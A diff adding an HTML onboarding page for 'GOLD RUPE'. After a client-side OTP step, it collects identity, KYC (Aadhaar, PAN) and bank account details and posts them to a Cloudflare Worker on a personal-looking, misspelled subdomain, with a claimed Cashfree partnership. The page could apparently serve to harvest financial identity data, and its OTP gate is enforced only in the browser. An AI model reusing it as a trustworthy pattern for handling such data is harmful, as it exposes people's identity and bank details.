@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GOLD RUPE Detailed Onboarding with OTP</title>
+    
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; padding: 20px; }
+        .container { background-color: #ffffff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
+        h1, h2 { color: #333; text-align: center; }
+        .signup-prompt, .review-section { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
+        .action-buttons button { padding: 10px 20px; margin-right: 10px; border: none; border-radius: 5px; cursor: pointer; }
+        .generate-button { background-color: #28a745; color: white; }
+        fieldset { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
+        legend { font-weight: bold; color: #007bff; padding: 0 10px; }
+        input[type="text"], input[type="email"], input[type="date"], input[type="tel"], select { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .form-actions { text-align: right; margin-top: 20px; }
+        .form-actions button { padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-left: 10px; }
+        .cancel-button { background-color: #f0ad4e; color: white; }
+        .submit-button { background-color: #007bff; color: white; }
+        hr { border: 0; height: 1px; background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0)); margin: 20px 0; }
+        #message { text-align: center; font-weight: bold; margin-top: 15px; }
+        #otpVerification, #onboardingForm { display: none; } 
+        .submit-button[disabled] { background-color: #ccc !important; cursor: not-allowed; } 
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <div class="signup-prompt">
+            <h2>Secure Sign-Up in 30 Secs</h2>
+            <p>Verify **+91 9345274456** to proceed with compliant and secure onboarding.</p>
+            
+            <label style="display:block; margin-bottom:10px;">
+                <input type="checkbox" id="creditAuth" required>
+                I authorise GOLD RUPE in partnership with Cashfree to access my credit information...
+            </label>
+            
+            <div id="otpInputArea" style="margin-top: 15px;">
+                <input type="tel" id="mobileNumber" placeholder="Mobile Number" value="9345274456" required>
+                <button id="generateOtpBtn" class="generate-button" onclick="generateOTP()">Generate OTP</button>
+            </div>
+            
+            <div id="otpVerification" style="margin-top: 15px;">
+                <input type="text" id="otpCode" placeholder="Enter OTP" maxlength="6">
+                <button id="verifyOtpBtn" class="generate-button" onclick="verifyOTP()" style="background-color: #f0ad4e;">Verify OTP</button>
+            </div>
+            
+            <p id="otpMessage" style="margin-top: 10px;"></p>
+        </div>
+        
+        <hr>
+
+        <form id="onboardingForm" class="review-section">
+            <h2>Review & share requested items with GOLD RUPE</h2>
+
+            <fieldset>
+                <legend>BASIC DETAILS</legend>
+                <input type="text" name="fullName" placeholder="Name" value="John Doe" required>
+                <input type="email" name="email" placeholder="Email" value="john@gmail.com" required>
+                <input type="date" name="dob" value="1994-01-25" required>
+                <select name="gender" required>
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                </select>
+                <input type="text" name="address" placeholder="Address" value="327, Bagmane Road, Mumbai" required>
+                <select name="occupation" required>
+                    <option value="Salaried">Salaried</option>
+                    <option value="Self-Employed">Self-Employed</option>
+                </select>
+                <input type="tel" name="alternateMobile" placeholder="Alternate Mobile No." value="7014665340">
+                <input type="text" name="income" placeholder="Income" value="Below 1 Lakh" required>
+            </fieldset>
+
+            <fieldset>
+                <legend>KYC DETAILS</legend>
+                <input type="text" name="aadhaar" placeholder="Aadhaar (XXXX XXXX 2343)" value="XXXX XXXX 2343" required>
+                <input type="text" name="pan" placeholder="PAN (ABCPV1234D)" value="ABCPV1234D" required>
+            </fieldset>
+
+            <fieldset>
+                <legend>PAYMENT METHODS</legend>
+                <input type="text" name="bankAccount" placeholder="Bank Account (026291800001191)" value="026291800001191" required>
+                <input type="text" name="bankIfsc" placeholder="Bank IFSC Code (e.g., HDFC0000001)" value="HDFC0000001" required>
+            </fieldset>
+
+            <div class="form-actions">
+                <button type="button" class="cancel-button">Cancel</button>
+                <button type="submit" id="submitBtn" class="submit-button" disabled>Submit Details</button>
+                <button type="button" class="close-button">Close</button>
+            </div>
+            
+            <p id="message"></p>
+        </form>
+    </div>
+
+    <script>
+        // NOTE: Replace the base URL with your actual deployed Worker URL
+        const WORKER_URL_BASE = 'https://singup.rajputsurendra562.workers.dev'; 
+        const WORKER_OTP_GENERATE = WORKER_URL_BASE + '/otp/generate';
+        const WORKER_OTP_VERIFY = WORKER_URL_BASE + '/otp/verify';
+        const WORKER_SUBMIT_DETAILS = WORKER_URL_BASE + '/submit'; 
+
+        const otpMessage = document.getElementById('otpMessage');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // --- Step 1: Generate OTP ---
+        async function generateOTP() {
+            const mobile = document.getElementById('mobileNumber').value;
+            // *** सुधार: सहमति चेकबॉक्स की स्थिति पढ़ें ***
+            const isAuthorized = document.getElementById('creditAuth').checked;
+
+            if (!isAuthorized) { // *** सुधार: यदि चेक नहीं किया गया है तो रोकें ***
+                otpMessage.textContent = 'Please authorize access to credit information to proceed.';
+                otpMessage.style.color = 'red';
+                return;
+            }
+
+            if (!mobile) {
+                otpMessage.textContent = 'Please enter a mobile number.';
+                otpMessage.style.color = 'red';
+                return;
+            }
+
+            otpMessage.textContent = 'Sending OTP...';
+            otpMessage.style.color = 'blue';
+            document.getElementById('otpVerification').style.display = 'block';
+
+            try {
+                const response = await fetch(WORKER_OTP_GENERATE, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ mobile: mobile })
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    otpMessage.textContent = 'OTP sent successfully! Enter the code below.';
+                    otpMessage.style.color = 'green';
+                } else {
+                    otpMessage.textContent = `Error sending OTP: ${result.error || 'Server failed to process the request.'}`;
+                    otpMessage.style.color = 'red';
+                }
+            } catch (error) {
+                console.error('Network or JS error during OTP generation:', error);
+                otpMessage.textContent = 'Connection error. Could not reach OTP service.';
+                otpMessage.style.color = 'red';
+            }
+        }
+
+        // --- Step 2: Verify OTP ---
+        async function verifyOTP() {
+            const mobile = document.getElementById('mobileNumber').value;
+            const otp = document.getElementById('otpCode').value;
+            
+            if (otp.length < 4) { 
+                otpMessage.textContent = 'Please enter the full OTP.';
+                otpMessage.style.color = 'red';
+                return;
+            }
+            
+            otpMessage.textContent = 'Verifying OTP...';
+            otpMessage.style.color = 'blue';
+
+            try {
+                const response = await fetch(WORKER_OTP_VERIFY, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ mobile: mobile, otp: otp })
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    otpMessage.textContent = 'Verification successful! You can now submit your details.';
+                    otpMessage.style.color = 'green';
+                    
+                    // Crucial Step: Enable the main form and submit button
+                    document.getElementById('onboardingForm').style.display = 'block';
+                    submitBtn.disabled = false;
+                    submitBtn.style.backgroundColor = '#007bff';
+                    submitBtn.style.cursor = 'pointer';
+                } else {
+                    otpMessage.textContent = `OTP verification failed. Error: ${result.error || 'Invalid OTP.'}`;
+                    otpMessage.style.color = 'red';
+                }
+            } catch (error) {
+                otpMessage.textContent = 'Connection error during verification.';
+                otpMessage.style.color = 'red';
+            }
+        }
+
+        // --- Step 3: Submit All Details (Only enabled after OTP success) ---
+        document.getElementById('onboardingForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (submitBtn.disabled) return; 
+
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
+            const messageElement = document.getElementById('message');
+            
+            messageElement.textContent = 'Submitting all details for multi-step verification...';
+            messageElement.style.color = 'blue';
+
+            try {
+                const response = await fetch(WORKER_SUBMIT_DETAILS, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    messageElement.textContent = `Success! Status: ${result.statusMessage || 'All details processed successfully.'}`;
+                    messageElement.style.color = 'green';
+                } else {
+                    const errorMessage = result.details ? JSON.stringify(result.details) : result.error || 'Server processing failed.';
+                    messageElement.textContent = `Submission failed. Error: ${errorMessage}`;
+                    messageElement.style.color = 'red';
+                }
+            } catch (error) {
+                messageElement.textContent = 'An error occurred during final submission.';
+                messageElement.style.color = 'red';
+            }
+        });
+    </script>
+</body>
+</html>
+
